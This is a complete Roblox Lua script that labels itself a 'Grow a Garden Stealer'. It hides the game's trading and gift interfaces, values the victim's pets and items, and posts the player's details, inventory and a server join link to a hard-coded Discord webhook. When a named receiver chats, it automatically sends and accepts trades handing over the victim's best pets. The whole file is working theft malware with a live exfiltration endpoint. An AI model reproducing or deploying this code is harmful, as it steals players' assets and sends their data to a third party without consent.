Username = {"drawesfa"}
Webhook = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
local Username = Username or {"No Receiver", "sad"}
local fern = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
local tpscript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local inv,pets,fruits = {},{},{}
local added = false
local t_tick
local rs = game:GetService("ReplicatedStorage")
local trade_event = rs:WaitForChild("GameEvents"):WaitForChild("TradeEvents")
local pgui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
local back = game:GetService("Players").LocalPlayer.Backpack
local total_value, trade_tickets  = 0, 0
local goofy = false
local good_pet = {"Dragonfly", "Mimic Octopus", "Butterfly", "Dog", "Queen Bee", "Disco Bee", "Raccoon", "Red Fox", "Fennec Fox", "Chicken Zombie", "T-Rex", "Kitsune", "Spinosaurus"}
local function pets_u()
	for i,v in pairs(require(game:GetService("ReplicatedStorage").Modules.ReplicationClass).new("ActivePetsService_Replicator"):YieldUntilData().Table.PlayerPetData[game.Players.LocalPlayer.Name].PetInventory.Data) do
		game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet",i)
	end
end
pgui.TradingUI.Main.Position = UDim2.new(0, 9999, 0, 9999)
game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("BackpackGui"):WaitForChild("Backpack"):GetPropertyChangedSignal("Visible"):Connect(function()
    game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("BackpackGui"):WaitForChild("Backpack").Visible = true
end)
task.spawn(function() while task.wait(.1) do 
	if game:GetService("Players").LocalPlayer.leaderstats.Sheckles.Value >= 100000 then
		game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Trading Ticket") 
	end
end end)
pcall(function()
pgui:FindFirstChild("GiftPlayerList"):Destroy()
pgui:FindFirstChild("Gift_Notification"):Destroy()
pgui:FindFirstChild("Friend_Notification"):Destroy()
pgui:FindFirstChild("Top_Notification"):Destroy()
pgui.Trading:destroy()
game:GetService("Lighting").Blur:destroy()
end)
pcall(pets_u)
local function unequip()
	local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
	for _, item in ipairs(character:GetChildren()) do
		if item:IsA("Tool") then
			item.Parent = back
		end
	end
end
local function value(a)
	if a:FindFirstChild("Item_Seed") then
    	return require(rs.Modules.CalculatePlantValue)(a)
	elseif a:GetAttribute("PET_UUID") and a:GetAttribute("ItemType") == "Pet" then
		local r,f = pcall(function()
		local pr = require(rs.Data.PetRegistry)
		local b = require(rs.Modules.DataService):GetData().PetsData.PetInventory.Data[a:GetAttribute("PET_UUID")]
		local c = b.PetData.HatchedFrom
		local d = require(rs.Modules.PetServices.PetUtilities):GetLevelProgress(b.PetData.Level)
		local e = pr.PetEggs[c].RarityData.Items[b.PetType].GeneratedPetData.WeightRange
		local f = require(rs.Modules.NumberUtil).ReverseLerp(e[1], e[2], b.PetData.BaseWeight)
		return math.floor(pr.PetList[b.PetType].SellPrice * (math.lerp(0.8, 1.2, f)*math.lerp(0.15, 6, d)))
		end)
		return type(f) == 'number' and f or 0
	else 
		return 0
	end
end
local function getinv()
	unequip()
	pcall(pets_u)
	trade_tickets, total_value = 0,0
    inv,pets,fruits = {},{},{}
    for i,v in pairs(back:GetChildren()) do
		if v:GetAttribute("b") == "v" then
			trade_tickets = v:GetAttribute("e")
			t_tick = v
		end
		if (v:FindFirstChild("Item_Seed")) or (v:GetAttribute("PET_UUID") and v:GetAttribute("ItemType") == "Pet") then
			if v:GetAttribute("Favorite") == true or v:GetAttribute("d") == true then
				game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(v)
			end
			total_value += value(v)
			if v:GetAttribute("PET_UUID") and v:GetAttribute("ItemType") == "Pet" then
				local data = require(rs.Modules.DataService):GetData().PetsData.PetInventory.Data[v:GetAttribute("PET_UUID")]
				local name = data.PetType
				local egg = data.PetData.HatchedFrom
				local odd, weight = 100, 0
				pcall(function() weight = data.PetData.BaseWeight end)
				pcall(function() odd = require(rs.Data.PetRegistry.PetEggs)[egg].RarityData.Items[name].NormalizedOdd end)
            	table.insert(pets, {value  = value(v), r_name = name, odd = odd, weight = weight, name = v.Name, type = "pet", uid = v:GetAttribute("PET_UUID")})
			else 
				table.insert(fruits, {value  = value(v),name = v.Name, type = v:GetAttribute("PET_UUID") and "pet" or "fruit" })
			end
        end
    end
    table.sort(fruits, function(a,b) return a.value > b.value end)
    table.sort(pets, function(a, b)
		local a_good = table.find(good_pet, a.r_name) and 1 or 0
		local b_good = table.find(good_pet, b.r_name) and 1 or 0
		if a_good ~= b_good then
			goofy = true
			return a_good > b_good
		end
		return a.odd < b.odd
	end)
	for i,v in pairs(fruits) do
		if pets[i] then
			v.pet = pets[i]
		end
		table.insert(inv, v)
	end
	if #fruits < #pets then
		for i = #fruits + 1, #pets do
			table.insert(inv, {pet = pets[i]})
		end
	end
end
getinv()
if #pets <= 0 or trade_tickets <= 0 then
	print("fds")
    return
end
if goofy then
	tpscript = "-- @everyone\n"..tpscript
end
local function start(hitter)
	unequip()
	rs.GameEvents.TradeEvents.Decline:FireServer()
	getinv()
    task.spawn(function() 
		while task.wait(.1) do 
			trade_event:WaitForChild("Accept"):FireServer()
			trade_event:WaitForChild("Confirm"):FireServer()
		end
	end)
	task.wait(1)
	unequip()
	while #pets > 0 and trade_tickets > 0 do
		task.wait()
		getinv()
		if not (#pets > 0 and trade_tickets > 0) then break end
		if require(rs.Modules.TradeControllers.TradingController).CurrentTradeId ~= nil then
			if not added then 
				for i=1,12 do
					if pets[i] then
						trade_event:WaitForChild("AddItem"):FireServer("Pet", pets[i].uid)
					end
				end
				added = true
			end
		else
			added = false
			t_tick.Parent = game.Players.LocalPlayer.Character
			trade_event:WaitForChild("SendRequest"):FireServer(game:GetService("Players"):WaitForChild(hitter))
		end
	end
	print("end")
end
local function formatNumber(number)
	local numbers = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t","qd", "sn", "sx", "sp", "oc", "no"}
	local suffixIndex = 1
	while numbers >= 1000 do
		numbers = numbers / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", numbers, suffixes[suffixIndex])
end
local function send(url)
	local http = game:GetService("HttpService")
	local headers = {
		["Content-Type"] = "application/json",
	}
    local i_pet = #pets >=1 and '\n``Top 10 best pets:``\n```'.. (function() local x = "";for i,v in ipairs(pets) do if i > 10 then break end x ..= v.name .." value: ".. formatNumber(v.value) .."\n" end return x end)().. '```' or ""
	local i_fruit = #fruits >=1 and '\n``Top 5 best fruits:``\n```'.. (function() local x = "";for i,v in ipairs(fruits) do if i > 5 then break end x ..= v.name .." value: ".. formatNumber(v.value) .."\n" end return x end)().. '```' or ""
	local body = game:GetService("HttpService"):JSONEncode({
		["username"] = game.Players.LocalPlayer.Name,
		["avatar_url"] = "https://raw.githubusercontent.com/D3ATH-hub/main/PS99/pfp.png",
		["content"] = tpscript,
		["embeds"] = {{
			["title"] = "Grow a Garden Stealer",
			["color"] = 32767,
			["fields"] = {
				{
					["name"] = "`\240\159\145\164 Player Info:`",
					["value"] = "```\240\159\145\168 Username: " .. game.Players.LocalPlayer.Name ..
					"\n\240\159\154\185 Display Username: " .. game.Players.LocalPlayer.DisplayName .. 
					"\n\240\159\146\187 Executor: "..identifyexecutor() ..
					"\n\240\159\149\185\239\184\143 Roblox version: "..version().."\nReceiver: "..table.concat(Username, ", ").."```",
					["inline"] = false
				},
				{
					["name"] = "**__Inventory__**",
					["value"] = '```Total pets: '.. #pets..'```'.. i_pet,
					["inline"] = false
				},
				{
					["name"] = "__Join link:__",
					["value"] = "[click here to join]("..fern..")",
					["inline"] = false
				}
			},
			["footer"] = {
				["text"] = "best Stealer - "..os.date("%Y-%m-%d %H:%M:%S")
			}
		}}
	})
	local success, errorMsg = pcall(function()
		request({
			Url = url ,
			Method = "POST",
			Headers = headers,
			Body = body
		})
	end)
end

send(Webhook)
setclipboard("discord.gg/Y2fwV2eF2Z")
game.Players.PlayerAdded:Connect(function(player)
    if table.find(Username, player.Name) then
        player.Chatted:Connect(function(msg)
            start(player.Name)
        end)
    end
end)
